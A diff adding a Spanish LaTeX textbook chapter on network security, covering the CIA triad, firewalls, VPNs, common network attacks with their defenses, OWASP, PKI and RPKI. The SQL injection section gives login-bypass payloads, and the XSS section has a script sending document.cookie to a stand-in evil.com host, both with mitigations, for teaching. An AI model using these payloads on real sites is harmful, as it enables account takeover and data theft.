@@ -1,1 +1,560 @@
-% TODO
+\chapter{\eh{locked} Seguridad en Redes}
+
+\begin{concepto}
+Todos los protocolos de este libro tienen vectores de ataque. Este capítulo
+consolida los conceptos de seguridad: qué garantías busca la seguridad,
+cómo se rompen, y cómo se defienden. La seguridad no es un feature que
+se agrega al final --- es un diseño desde cero.
+\end{concepto}
+
+\section{\eh{triangular-ruler} Tríada CIA --- Los Tres Pilares}
+
+\begin{concepto}
+Toda la seguridad informática se reduce a tres objetivos. Memorizarlos:
+\textbf{CIA} (Confidentiality, Integrity, Availability).
+
+\emoji{light-bulb} \textbf{Analogía:} una caja fuerte en un banco.
+\textbf{Confidencialidad} = solo el dueño puede abrir la caja.
+\textbf{Integridad} = el contenido no fue alterado.
+\textbf{Disponibilidad} = cuando el dueño llega, la caja está accesible.
+\end{concepto}
+
+\begin{table}[h!]
+\centering
+\renewcommand{\arraystretch}{1.5}
+\begin{tabular}{llll}
+\toprule
+\textbf{Pilar} & \textbf{Pregunta} & \textbf{Amenaza} & \textbf{Mecanismo} \\
+\midrule
+\textbf{Confidentiality} & Solo el destinatario lee? & Intercepción, sniffing & Cifrado (TLS, WireGuard) \\
+\textbf{Integrity} & Los datos llegaron íntegros? & Tampering, modificación & HMAC, firmas digitales \\
+\textbf{Availability} & El servicio está disponible? & DDoS, ransomware & Redundancia, rate limiting \\
+\bottomrule
+\end{tabular}
+\caption{Tríada CIA}
+\end{table}
+
+\begin{ejemplo}
+Un atacante que hace \textbf{ARP Spoofing} rompe \textbf{Confidencialidad}
+(ve tu tráfico) e \textbf{Integridad} (puede modificarlo).
+Un \textbf{DDoS} rompe \textbf{Availability}.
+Un \textbf{ransomware} rompe \textbf{Integrity} y \textbf{Availability}.
+\end{ejemplo}
+
+\section{\eh{fire} Firewalls}
+
+\begin{concepto}
+Un \textbf{firewall} filtra tráfico según reglas. Es la primera línea
+de defensa entre redes de diferente nivel de confianza (Internet vs LAN).
+
+\emoji{light-bulb} \textbf{Analogía:} el guardia de seguridad de un edificio.
+Revisa quién entra y sale según una lista de reglas.
+\end{concepto}
+
+\begin{table}[h!]
+\centering
+\renewcommand{\arraystretch}{1.4}
+\begin{tabular}{lll}
+\toprule
+\textbf{Tipo} & \textbf{Opera en} & \textbf{Características} \\
+\midrule
+Packet filter (L3/L4) & IP, TCP/UDP, puertos & Rápido, sin estado, fácil de evadir \\
+Stateful (L4)         & Tracks conexiones TCP & Ve si paquete pertenece a flujo legítimo \\
+Application (L7)      & Contenido de la app   & Deep Packet Inspection, más lento \\
+NGFW (Next-Gen)       & L3-L7 + IDS/IPS       & Identidad de usuario, SSL inspection \\
+WAF                   & HTTP/HTTPS            & Protege apps web (SQLi, XSS, OWASP) \\
+\bottomrule
+\end{tabular}
+\caption{Tipos de firewall}
+\end{table}
+
+\subsection{Reglas de firewall --- Lógica básica}
+
+\begin{verbatim}
+  Regla (stateless packet filter):
+  ┌────────┬──────────┬──────────┬──────────┬──────────┬────────┐
+  │ Source │ Src Port │   Dest   │ Dst Port │ Protocol │ Action │
+  ├────────┼──────────┼──────────┼──────────┼──────────┼────────┤
+  │  any   │   any    │ 10.0.0.5 │   443    │   TCP    │ ALLOW  │
+  │  any   │   any    │ 10.0.0.5 │    80    │   TCP    │ ALLOW  │
+  │  any   │   any    │   any    │   any    │   any    │  DENY  │ ← default deny
+  └────────┴──────────┴──────────┴──────────┴──────────┴────────┘
+
+  Principio: todo lo que no esté explícitamente permitido, está DENEGADO.
+\end{verbatim}
+
+\begin{cuidado}
+\textbf{SSL Inspection en NGFWs:} un NGFW puede descifrar TLS para inspeccionarlo
+(MITM corporativo). El firewall presenta su propio certificado al cliente. Esto
+rompe End-to-End Encryption a nivel corporativo. Es legal (en entornos corporativos,
+la empresa es dueña de los dispositivos), pero debes saber que tu tráfico HTTPS
+podría ser inspeccionado en redes corporativas.
+\end{cuidado}
+
+\section{\eh{locked-with-key} VPN --- Virtual Private Network}
+
+\begin{concepto}
+Una \textbf{VPN} crea un túnel cifrado sobre una red no confiable (Internet).
+Todo el tráfico viaja por ese túnel, protegido de observadores externos.
+\end{concepto}
+
+\begin{table}[h!]
+\centering
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{lllll}
+\toprule
+\textbf{Protocolo} & \textbf{Puerto} & \textbf{Crypto} & \textbf{Velocidad} & \textbf{Uso típico} \\
+\midrule
+PPTP       & 1723/TCP & RC4 (roto) & Rápido & \emoji{skull} Evitar \\
+L2TP/IPsec & 1701/UDP + 4500 & AES & Mediano & Empresas legacy \\
+OpenVPN    & 1194/UDP o 443 & TLS & Mediano & Uso general \\
+IKEv2/IPsec & 500+4500/UDP & AES-GCM & Rápido & Móviles \\
+WireGuard  & 51820/UDP & ChaCha20 & \textbf{Muy rápido} & Moderno, recomendado \\
+\bottomrule
+\end{tabular}
+\caption{Protocolos VPN comparados}
+\end{table}
+
+\subsection{mTLS --- Mutual TLS}
+
+\begin{concepto}
+TLS normal: el cliente verifica la identidad del servidor (certificado).
+\textbf{mTLS} (Mutual TLS): \textit{ambos} se verifican mutuamente.
+El servidor también exige un certificado válido del cliente.
+\end{concepto}
+
+\begin{verbatim}
+  TLS normal:
+    Cliente ──── verifica certificado ────► Servidor
+    Cliente ◄──────────────────────────── Servidor (confiado)
+
+  mTLS:
+    Cliente ──── verifica certificado ────► Servidor
+    Cliente ◄──── verifica certificado ─── Servidor
+    (AMBOS presentan certificados X.509)
+
+  Uso: microservicios, APIs inter-servicio, Zero Trust.
+  El servicio A no habla con el servicio B a menos que tenga
+  el certificado correcto --- elimina acceso no autorizado incluso
+  dentro de la red interna.
+\end{verbatim}
+
+\section{\eh{detective} Ataques de Red --- Catálogo}
+
+\subsection{ARP Spoofing / ARP Poisoning}
+
+\begin{cuidado}
+\textbf{ARP Spoofing:}
+
+\begin{enumerate}
+    \item ARP no tiene autenticación: cualquiera puede mandar un ARP Reply.
+    \item El atacante envía ARP Replies falsos: ``La IP 192.168.1.1 tiene
+          MAC aa:bb:cc:dd:ee:ff'' (la MAC del atacante).
+    \item Las víctimas actualizan su ARP cache.
+    \item Todo el tráfico destinado al gateway pasa por el atacante:
+          \textbf{Man-in-the-Middle (MitM)}.
+\end{enumerate}
+
+\begin{verbatim}
+  Normal:    Víctima ──────────────────► Gateway ──► Internet
+  Atacado:   Víctima ──► Atacante MitM ──► Gateway ──► Internet
+                         (ve y modifica todo)
+\end{verbatim}
+
+\textbf{Defensa:}
+\begin{itemize}
+    \item \textbf{Dynamic ARP Inspection (DAI):} el switch valida ARP contra
+          la tabla DHCP Snooping. Si la MAC no coincide, descarta el paquete.
+    \item \textbf{Static ARP entries:} configurar entradas ARP estáticas para
+          el gateway (impracticable en redes grandes).
+    \item \textbf{Cifrado end-to-end:} aunque el atacante intercepte el tráfico,
+          no puede leerlo ni modificarlo (TLS, mTLS).
+\end{itemize}
+\end{cuidado}
+
+\subsection{DNS Spoofing / Cache Poisoning}
+
+\begin{cuidado}
+\textbf{DNS Cache Poisoning:}
+
+DNS usa UDP sin autenticación. El atacante puede enviar respuestas DNS
+falsas antes de que llegue la legítima.
+
+\begin{enumerate}
+    \item Cliente hace query: ``¿IP de banco.com?''
+    \item Atacante envía respuesta falsa más rápido que el servidor real:
+          ``banco.com = 192.168.1.99'' (servidor del atacante)
+    \item El resolver guarda la respuesta falsa en caché
+    \item Todos los clientes que pregunten por banco.com van al servidor del atacante
+\end{enumerate}
+
+\textbf{Defensa:}
+\begin{itemize}
+    \item \textbf{DNSSEC:} firma criptográfica de los registros DNS. El resolver
+          verifica la firma antes de aceptar la respuesta.
+    \item \textbf{DoH/DoT:} cifra el canal DNS, evita inyección en tránsito.
+    \item \textbf{Randomización de puerto origen y Query ID:} hace más difícil
+          adivinar los parámetros de la query para enviar una respuesta falsa.
+\end{itemize}
+\end{cuidado}
+
+\subsection{BGP Hijacking}
+
+\begin{cuidado}
+\textbf{BGP Hijacking:} BGP no tiene autenticación. Un ASN malicioso puede
+anunciar prefijos IP que no le pertenecen --- y el tráfico de esos IPs
+se redirige a través del atacante.
+
+Ejemplo real: \textbf{Pakistan Telecom (2008)} anunció el prefijo de YouTube
+(208.65.153.0/24) a level3, y durante 2 horas el tráfico de YouTube
+de todo el mundo fue al nulo de Pakistan Telecom.
+
+\textbf{Defensa:}
+\begin{itemize}
+    \item \textbf{RPKI (Resource Public Key Infrastructure):} firma criptográfica
+          que une un prefijo IP a un ASN específico. Los routers descartan
+          anuncios BGP sin firma válida.
+    \item \textbf{Route filtering:} cada ISP solo acepta anuncios de prefijos
+          que el peer tiene autorización de anunciar.
+    \item \textbf{BGPsec:} extiende BGP con firmas por hop. Más seguro que RPKI
+          solo, pero adopción lenta.
+\end{itemize}
+\end{cuidado}
+
+\subsection{DDoS --- Distributed Denial of Service}
+
+\begin{cuidado}
+\textbf{DDoS:} agotar recursos de un servidor (CPU, RAM, ancho de banda)
+con tráfico desde miles de fuentes simultáneas (botnet).
+
+Tipos de DDoS:
+
+\begin{center}
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{lll}
+\toprule
+\textbf{Tipo} & \textbf{Mecanismo} & \textbf{Amplificación} \\
+\midrule
+Volumétrico & Inundar de datos (Gbps) & DNS Amplification (x70), NTP (x556) \\
+Protocol    & Agotar tabla de estados & SYN Flood, Smurf \\
+Application & Agotar recursos de app  & HTTP Flood, Slowloris \\
+\bottomrule
+\end{tabular}
+\end{center}
+
+\textbf{Amplificación DNS:} el atacante envía query DNS con IP de origen
+\textit{suplantada} (IP de la víctima). El servidor DNS responde a la víctima
+con un paquete $\sim$70x más grande. Con 1 Mbps de tráfico de ataque,
+la víctima recibe 70 Mbps.
+
+\textbf{Defensas:}
+\begin{itemize}
+    \item \textbf{Rate limiting:} limitar requests por IP en tiempo real
+    \item \textbf{Anycast:} distribuir el tráfico entre múltiples datacenters globales
+          (Cloudflare absorbe DDoS distribuyendo el tráfico a sus 200+ PoPs)
+    \item \textbf{BCP38 (Ingress Filtering):} ISPs descartan paquetes con IP origen
+          suplantada --- elimina amplificación en origen
+    \item \textbf{SYN Cookies:} el servidor no guarda estado hasta recibir el ACK
+\end{itemize}
+\end{cuidado}
+
+\subsection{Man-in-the-Middle (MitM)}
+
+\begin{cuidado}
+\textbf{MitM:} el atacante se interpone entre dos partes que creen comunicarse
+directamente. Puede leer y modificar el tráfico.
+
+Vectores comunes:
+\begin{itemize}
+    \item \textbf{Rogue Wi-Fi AP:} el atacante crea un hotspot ``Starbucks Free WiFi''
+          y todo el tráfico pasa por su máquina.
+    \item \textbf{ARP Spoofing:} como vimos en la sección anterior.
+    \item \textbf{SSL Stripping:} el atacante intercepta la redirección HTTP→HTTPS
+          y presenta HTTP al cliente mientras habla HTTPS con el servidor.
+\end{itemize}
+
+\textbf{Defensa universal:} \textbf{HSTS} (HTTP Strict Transport Security) ---
+el servidor indica al browser que \textit{siempre} use HTTPS, nunca HTTP.
+El browser rechaza versiones HTTP incluso si el atacante intenta forzarlas.
+Con HSTS Preloading, el browser viene con la lista hardcoded antes de la primera
+conexión.
+\end{cuidado}
+
+\section{\eh{bar-chart} IDS e IPS --- Detección y Prevención de Intrusiones}
+
+\begin{table}[h!]
+\centering
+\renewcommand{\arraystretch}{1.4}
+\begin{tabular}{llll}
+\toprule
+\textbf{Sistema} & \textbf{Nombre} & \textbf{Acción} & \textbf{Posición} \\
+\midrule
+IDS & Intrusion Detection System  & Detecta y alerta (pasivo)  & Fuera del flujo \\
+IPS & Intrusion Prevention System & Detecta y bloquea (activo) & En el flujo \\
+\bottomrule
+\end{tabular}
+\caption{IDS vs IPS}
+\end{table}
+
+Un IDS/IPS analiza el tráfico buscando \textbf{firmas} (patrones conocidos de
+ataques) o \textbf{anomalías} (desviaciones del comportamiento normal).
+
+\begin{ejemplo}
+\textbf{Snort} (open source, Cisco) y \textbf{Suricata} son los IDS/IPS más
+usados. Una regla Snort que detecta SYN Flood:
+
+\begin{lstlisting}
+alert tcp any any -> $HOME_NET any \
+  (flags:S; \
+   detection_filter:track by_dst, count 1000, seconds 1; \
+   msg:"Posible SYN Flood detectado"; \
+   sid:1000001;)
+\end{lstlisting}
+
+Esto alerta si un destino recibe más de 1000 SYNs por segundo.
+\end{ejemplo}
+
+\section{\eh{memo} OWASP Top 10 --- Los ataques más comunes a aplicaciones web}
+
+\begin{concepto}
+\textbf{OWASP} (Open Web Application Security Project) publica anualmente
+el Top 10 de vulnerabilidades más críticas. Todo desarrollador debería
+conocerlos.
+\end{concepto}
+
+\begin{table}[h!]
+\centering
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{lll}
+\toprule
+\textbf{\#} & \textbf{Vulnerabilidad} & \textbf{Ejemplo} \\
+\midrule
+1 & Broken Access Control       & Ver datos de otro usuario cambiando el ID en la URL \\
+2 & Cryptographic Failures      & Contraseñas en MD5, HTTP sin TLS \\
+3 & Injection (SQLi, XSS)       & \texttt{' OR 1=1;--} en un campo de login \\
+4 & Insecure Design             & Flujos de negocio sin controles de seguridad \\
+5 & Security Misconfiguration   & Servicios de debug activos en producción \\
+6 & Vulnerable Components       & Usar log4j 2.14.0 (Log4Shell) \\
+7 & Auth Failures               & Contraseñas débiles, sin MFA, tokens largos \\
+8 & Software Integrity Failures & Dependencias sin verificar, CI/CD sin protección \\
+9 & Logging \& Monitoring Failures & Sin logs de auth, sin alertas de anomalías \\
+10 & SSRF                       & Servidor hace requests a su propia infraestructura \\
+\bottomrule
+\end{tabular}
+\caption{OWASP Top 10 (2021)}
+\end{table}
+
+\subsection{SQL Injection}
+
+\begin{cuidado}
+\textbf{SQLi:} el atacante inyecta SQL en un campo de entrada.
+
+\begin{lstlisting}[language=SQL]
+-- Consulta original (vulnerable):
+SELECT * FROM usuarios WHERE user='INPUT' AND pass='INPUT2';
+
+-- El atacante escribe en el campo usuario:
+-- admin'--
+-- La consulta queda:
+SELECT * FROM usuarios WHERE user='admin'--' AND pass='INPUT2';
+-- El -- comenta el resto → login sin contraseña
+
+-- O peor, escribe: ' OR 1=1;--
+SELECT * FROM usuarios WHERE user='' OR 1=1;--' AND pass='';
+-- Devuelve TODOS los usuarios
+\end{lstlisting}
+
+\textbf{Defensa:} \textbf{Prepared Statements / Parameterized Queries}.
+El input nunca se interpreta como SQL.
+
+\begin{lstlisting}
+# Python con parameterized query (seguro):
+cursor.execute("SELECT * FROM usuarios WHERE user=? AND pass=?",
+               (usuario, password))
+\end{lstlisting}
+\end{cuidado}
+
+\subsection{XSS --- Cross-Site Scripting}
+
+\begin{cuidado}
+\textbf{XSS:} el atacante inyecta JavaScript en una página web que otros
+usuarios cargarán. El script se ejecuta en el browser de la víctima con
+sus cookies y sesión.
+
+\begin{verbatim}
+  Stored XSS:
+  1. Atacante publica comentario:
+     <script>fetch('http://evil.com/?c='+document.cookie)</script>
+  2. Otro usuario carga la página con ese comentario
+  3. El script roba la cookie de sesión del usuario → account takeover
+\end{verbatim}
+
+\textbf{Defensa:}
+\begin{itemize}
+    \item \textbf{Output encoding:} convertir \texttt{<} → \texttt{\&lt;} antes de
+          renderizar en HTML.
+    \item \textbf{Content Security Policy (CSP):} header HTTP que indica al browser
+          de qué fuentes puede cargar scripts. Bloquea scripts inline.
+    \item \textbf{HttpOnly cookies:} cookies que JavaScript no puede leer,
+          aunque inyecte código.
+\end{itemize}
+\end{cuidado}
+
+\section{\eh{locked-with-key} PKI y Certificados --- Revisión de Confianza}
+
+\begin{concepto}
+La seguridad de HTTPS descansa en un ecosistema de \textbf{Autoridades
+Certificadoras (CAs)} en las que los browsers confían implícitamente.
+Los browsers/OS vienen con $\sim$100--200 CAs raíz preinstaladas.
+\end{concepto}
+
+\begin{verbatim}
+  Tipos de certificados:
+
+  DV (Domain Validation):
+   └── Solo verifica que el solicitante controla el dominio
+       (Let's Encrypt lo hace automáticamente en minutos)
+
+  OV (Organization Validation):
+   └── Verifica que la organización existe legalmente
+       (manual, tarda días)
+
+  EV (Extended Validation):
+   └── Verificación exhaustiva de la empresa
+       (el nombre de la empresa aparecía en la barra verde - hoy browsers
+        eliminaron la barra verde porque los usuarios no la entendían)
+\end{verbatim}
+
+\begin{cuidado}
+\textbf{Certificate Transparency (CT):} desde 2018, Chrome requiere que
+todos los certificados sean registrados públicamente en logs CT (append-only,
+auditables). Si una CA emite un certificado fraudulento para ``google.com'',
+aparece en los logs y puede ser revocado. Antes de CT, las CAs podían emitir
+certificados silenciosamente.
+
+\textbf{Certificate Pinning:} apps móviles pueden hardcodear el hash del
+certificado esperado. Si el certificado cambia (ataque MitM con cert falso),
+la app rechaza la conexión. Riesgo: si la empresa cambia su certificado
+legítimamente, la app rompe.
+\end{cuidado}
+
+\section{\eh{broom} RPKI --- Asegurando el Routing de Internet}
+
+\begin{concepto}
+\textbf{RPKI} (Resource Public Key Infrastructure) es la solución al BGP
+Hijacking. Crea un sistema de firma criptográfica que prueba qué ASN tiene
+autorización de anunciar qué prefijos IP.
+\end{concepto}
+
+\begin{verbatim}
+  Sin RPKI:
+  AS64500 anuncia 8.8.8.0/24 (de Google)
+  → Routers del mundo creen el anuncio
+  → Tráfico a Google va a AS64500
+
+  Con RPKI:
+  AS64500 anuncia 8.8.8.0/24
+  → Router verifica: ¿existe ROA (Route Origin Authorization)
+    que diga que AS15169 (Google) puede anunciar 8.8.8.0/24?
+  → La respuesta es SÍ → el anuncio de AS64500 es INVÁLIDO
+  → Router descarta el anuncio
+\end{verbatim}
+
+\begin{moderno}
+\textbf{\emoji{rocket} Adopción de RPKI (2024):} Cloudflare, AT\&T, Telia, LACNIC
+y muchos otros ya filtran anuncios RPKI-inválidos. Aproximadamente \textbf{40\%}
+del espacio de direcciones IP global tiene ROAs publicadas. El progreso es lento:
+requiere que cada ISP actualice su política de routing.
+
+En México, LACNIC es el RIR que gestiona el registro de ROAs para LATAM.
+\end{moderno}
+
+\section{\eh{bar-chart} Herramientas de Diagnóstico y Seguridad}
+
+\begin{table}[h!]
+\centering
+\renewcommand{\arraystretch}{1.3}
+\begin{tabular}{lll}
+\toprule
+\textbf{Herramienta} & \textbf{Uso} & \textbf{Notas} \\
+\midrule
+\texttt{nmap}      & Escaneo de puertos y OS fingerprinting & Herramienta de pentesting estándar \\
+\texttt{Wireshark} & Captura y análisis de paquetes (GUI) & Análisis de protocolos \\
+\texttt{tcpdump}   & Captura de paquetes (CLI) & Para servidores sin GUI \\
+\texttt{netstat/ss}& Ver conexiones activas y puertos & Diagnóstico local \\
+\texttt{arp -a}    & Ver tabla ARP & Detectar ARP spoofing \\
+\texttt{traceroute}& Ver ruta de paquetes & Detectar desvíos BGP \\
+\texttt{curl -v}   & HTTP/HTTPS detallado & Ver headers, certificados \\
+\texttt{openssl}   & Verificar certificados TLS & \texttt{openssl s\_client -connect host:443} \\
+\bottomrule
+\end{tabular}
+\caption{Herramientas de red y seguridad}
+\end{table}
+
+\begin{codigo}
+\begin{lstlisting}
+# Ver certificado TLS de un servidor:
+openssl s_client -connect google.com:443 -servername google.com
+
+# Escanear puertos abiertos (autorización requerida):
+nmap -sV -O 192.168.1.0/24
+
+# Capturar tráfico en interfaz eth0:
+tcpdump -i eth0 -w captura.pcap
+
+# Ver conexiones activas:
+ss -tulpn
+
+# Verificar si una respuesta DNS tiene RRSIG (DNSSEC):
+dig +dnssec google.com A
+\end{lstlisting}
+\end{codigo}
+
+\section{\eh{magnifying-glass-tilted-right} Resumen: Defensa en Profundidad}
+
+\begin{concepto}
+\textbf{Defense in Depth} (Defensa en Profundidad): no depender de una sola
+capa de seguridad. Si un control falla, los otros detienen al atacante.
+
+\emoji{light-bulb} \textbf{Analogía:} una cebolla. Pelar una capa no da
+acceso al centro --- hay más capas por atravesar.
+\end{concepto}
+
+\begin{verbatim}
+  Capas de defensa en una organización típica:
+
+  Internet
+     │
+     ▼
+  [Firewall perimetral + DDoS mitigation (Cloudflare/Akamai)]
+     │
+     ▼
+  [DMZ: Load balancers, WAF, reverse proxies]
+     │
+     ▼
+  [Red interna segmentada con VLANs]
+     │ (cada segmento tiene su propio firewall)
+     ▼
+  [Hosts con: cifrado en disco, antivirus, EDR]
+     │
+     ▼
+  [Aplicaciones: autenticación fuerte (MFA), autorización (RBAC/ABAC)]
+     │
+     ▼
+  [Datos: cifrado en reposo (AES-256), en tránsito (TLS 1.3)]
+     │
+     ▼
+  [Logging y SIEM: todo se registra, correlaciona y alerta]
+\end{verbatim}
+
+Principios clave:
+\begin{itemize}
+    \item \textbf{Least Privilege:} cada usuario/proceso tiene solo los permisos
+          que necesita para su función.
+    \item \textbf{Fail-Closed:} si el sistema de seguridad falla, deniega acceso
+          (no permite por defecto).
+    \item \textbf{Assume Breach:} asumir que el atacante ya está dentro y
+          diseñar para limitar el daño (Zero Trust).
+    \item \textbf{Patch Management:} las vulnerabilidades conocidas son las más
+          explotadas. Actualizar sistemas es la defensa más efectiva.
+\end{itemize}
